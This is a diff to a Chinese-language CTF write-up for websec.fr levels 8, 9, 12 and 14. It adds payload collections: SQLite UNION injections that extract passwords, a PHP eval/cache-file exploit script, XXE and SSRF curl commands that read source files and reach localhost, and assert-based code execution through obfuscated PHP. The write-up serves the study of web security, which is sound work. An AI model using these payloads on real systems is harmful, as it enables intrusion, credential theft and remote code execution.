@@ -5,6 +5,7 @@ date: 2018-09-04 11:47:34
 tags: ctf
 keywords: websec.fr-writeup
 description: websec.fr-writeup
+password: websec.fr
 ---
 
 # level1
@@ -444,6 +445,100 @@ select id, login from users where id = 5 union select (select 2)g, (select x3 fr
 
 `WEBSEC{Because_blacklist_based_filter_are_always_great}`
 
+其他payload:
+
+```
+99 union select b,c from(select 1 a, 2 b, 3 c where 1 in (4) union select * from users)x where a between 1 and 1
+
+
+3 union select (WITH RECURSIVE cnt(x,y,z) AS (select * from users) SELECT z FROM cnt where nullif(x,2)),1
+
+
+select id,login from users where id=9 union select b,c from (select 1 as a,2 as b,3 as c where 1 in (2) union select * from users where id in (1))
+
+
+null -- using an illegal user id, so that we don't get rows from the original select
+
+union
+
+select 1, c from (
+    select null, null, null as c -- using any name works, as long as we name the third column
+    from (select 1 where null) -- selecting from an empty table ensures that this part doesn't actually contribute to the join
+
+    union
+
+    select * from users -- now we can use select *. union renames `password` to `c`
+    where id between 1 and 1 -- again, we want exactly one row. Since we can't use = or -, we use between
+)
+```
+
+
+
+# level9
+
+```
+<?php
+ini_set('display_errors', 'on');
+ini_set('error_reporting', E_ALL);
+if( isset ($_GET['submit']) && isset ($_GET['c'])) {
+    $randVal = sha1 (time ());
+
+    setcookie ('session_id', $randVal, time () + 2, '', '', true, true);
+
+    try {
+        $fh = fopen('/tmp/' . $randVal, 'w');
+
+        fwrite (
+            $fh,
+                   str_replace (
+                ['<?', '?>', '"', "'", '$', '&', '|', '{', '}', ';', '#', ':', '#', ']', '[', ',', '%', '(', ')'],
+                '',
+                $_GET['c']
+            )
+        );
+        fclose($fh);
+    } catch (Exception $e) {
+        var_dump ($e->getMessage ());
+    }
+}
+
+if (isset ($_GET['cache_file'])) {
+    if (file_exists ($_GET['cache_file'])) {
+        echo eval (stripcslashes (file_get_contents ($_GET['cache_file'])));
+    }
+}
+?>
+```
+
+payload:
+
+```
+stripcslashes('readfile\x28\x27flag.txt\x27\x29\x3b');
+
+echo file_get_contents\50\42flag.txt\42\51\73
+
+include <<<EOT
+flag.txt EOT ?>
+encode =>
+include+<<<EOT%0aflag.txt%0aEOT%0a%3f%3f>>
+eval( stripcslashes(urldecode('include+<<<EOT%0aflag.txt%0aEOT%0a%3f>')));
+
+import requests
+s = requests.session()
+LEVEL09 = "http://websec.fr/level09/index.php"
+c = """include<<<EOD
+flag.txt
+EOD
+??>>"""
+param = {"c":c,"submit":"OK"}
+r = s.get(LEVEL09,params=param)
+file_cache = r.cookies['session_id']
+param = {"cache_file":"/tmp/"+file_cache,"a":"1234"}
+r = s.get(LEVEL09,params=param)
+print r.text
+
+```
+
 # level8
 
 ```php
@@ -618,7 +713,93 @@ user_id=4&table=(select 4 id, enemy username from costume)&submit=%E6%8F%90%E4%B
 WEBSEC{Who_needs_AS_anyway_when_you_have_sqlite}
 ```
 
-# level14未解决
+# level12
+
+参考链接: https://www.anquanke.com/post/id/167140#h3-2
+
+首先通过finfo得到源码:
+
+`new finfo('1', '/')`
+
+略长，没有完全给出。
+
+```
+<?php
+/*
+Congratulation, you can read this file, but this is not the end of our journey.
+
+- Thanks to cutz for the QA.
+- Thanks to blotus for finding a (now fixed) weakness in the "encryption" function.
+- Thanks to nurfed for nagging us about a cheat
+*/
+
+$text = 'Niw0OgIsEykABg8qESRRCg4XNkEHNg0XCls4BwZaAVBbLU4EC2VFBTooPi0qLFUELQ==';
+$key = ini_get ('user_agent');
+
+if ($_SERVER['REMOTE_ADDR'] === '127.0.0.1') {
+    if ($_SERVER['HTTP_USER_AGENT'] !== $key) {
+        die ("Cheating is bad, m'kay?");
+    }
+
+    $i = 0;
+    $flag = '';
+    foreach (str_split (base64_decode ($text)) as $letter) {
+        $flag .= chr (ord ($key[$i++]) ^ ord ($letter));
+    }
+    die ($flag);
+}
+?>
+```
+
+然后还需要获取php.ini中的user-agent。由于路径未知，所以需要其他办法。
+
+虽然过滤了`splfileobject`, `globiterator`, `filesystemiterator`, and `directoryiterator`，但是可以绕过。
+
+`new \SplFileObject("http://39.106.97.201", 1)`
+
+绕过原因:
+
+**Without any namespace definition, all class and function definitions are placed into the global space - as it was in PHP before namespaces were supported. Prefixing a name with *\* will specify that the name is required from the global space even in the context of the namespace.**
+
+得到user-agent:
+
+![](/assets/websec/TIM截图20181205222022.png)
+
+```
+<?php
+$key = "aiviGohdahvueL0dedi5hievi0Ahsh1aor9aiQu5eemaisi7Phai9PhohpheiweiP7eifooVooviesh9meighoolahm3Phe0Ii6gieL1Pidoodiephein3iK8tae3aec";
+$text = "Niw0OgIsEykABg8qESRRCg4XNkEHNg0XCls4BwZaAVBbLU4EC2VFBTooPi0qLFUELQ==";
+$flag = "";
+foreach (str_split (base64_decode ($text)) as $letter) {
+    $flag .= chr (ord ($key[$i++]) ^ ord ($letter));
+}
+
+echo $flag;
+```
+
+得到flag.
+
+其他payload:
+
+```
+得到源码:
+curl -s --data 'submit=&class=SimpleXMLElement&param2=2&param1=<!DOCTYPE xxe [<!ENTITY foo SYSTEM "php://filter/read=convert.base64-encode/resource=/index.php">]><root>%26foo;</root>' http://websec.fr/level12/index.php | grep -oE -m1 '<pre>(.*)</pre>'
+可以继续获取php.ini，路径未知，
+也可以:
+通过ssrf获取flag:
+curl -s --data 'submit=&class=SimpleXMLElement&param2=2&param1=<!DOCTYPE xxe [<!ENTITY foo SYSTEM "http://127.0.0.1/level12/index.php">]><root>%26foo;</root>' http://websec.fr/level12/index.php | grep -oE -m1 'WEBSEC{.*}'
+```
+
+```
+It's possible to bypass the class filter by using Global namespace, thus we can use \SplFileObject along with a php://filter in order to read the whole file, as in:
+
+curl -sd 'submit=&class=\SplFileObject&param1=php://filter/convert.base64-encode/resource=index.php&param2=r' http://websec.fr/level12/index.php | grep -oE '<pre>(.*)</pre>'
+The page source we get (encoded in base64) contains some php codes that hint at using SSRF to decrypt the $flag with the server's $key = ini_get ('user_agent');, i.e.:
+
+curl -sd 'submit=&class=\SplFileObject&param1=php://filter/convert.quoted-printable-encode/resource=http://127.0.0.1/level12/index.php&param2=r' http://websec.fr/level12/index.php | grep -oE 'WEBSEC{.*}'
+```
+
+# level14
 
 ```php
 <?php
@@ -673,6 +854,62 @@ php > $a{1}('ls');
 
 ```
 $blacklist{562}();
+```
+
+根据爬去的方法名中可以找到如下几个方法:
+
+```
+finfo_open
+finfo_close
+finfo_set_flags
+finfo_file
+```
+
+说明开启了php_fileinfo扩展。
+
+从而可以得到payload:
+
+需要开启错误显示:
+
+```
+print(new finfo(6,'/'));
+
+这个也行：
+new finfo(0,'/');
+```
+
+payload集锦:
+
+```
+<?php
+$payload = ~'_GET';
+$payloadToSend = '$a=${~'. $payload .'};$a{0}($a{1});';
+
+$ch = curl_init('http://websec.fr/level14/index.php?0=assert&1=var_dump(file_get_contents(\'0e7efcd6e821f4bb90af4e4c439001944c1769da.php\'))');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, array(
+    'code' => $payloadToSend,
+));
+echo curl_exec($ch);
+curl_close($ch);
+```
+
+```
+Using finfo to read files but "." is blacklisted...
+
+PHP takes binary operations like a|b will be considered as 'c'
+
+So trying to craft a "." with '&' | ','
+
+We can now send code=new finfo(1,('&'|',')); and we get an error of finfo but with the content of every files in the directory.
+```
+
+```
+http://websec.fr/level14/index.php?a=assert&b=var_dump(scandir('.'))
+http://websec.fr/level14/index.php?a=assert&b=readfile('0e7efcd6e821f4bb90af4e4c439001944c1769da.php')
+
+code=${~%a0%b8%ba%ab}{a}(${~%a0%b8%ba%ab}{b});
 ```
 
 # level15
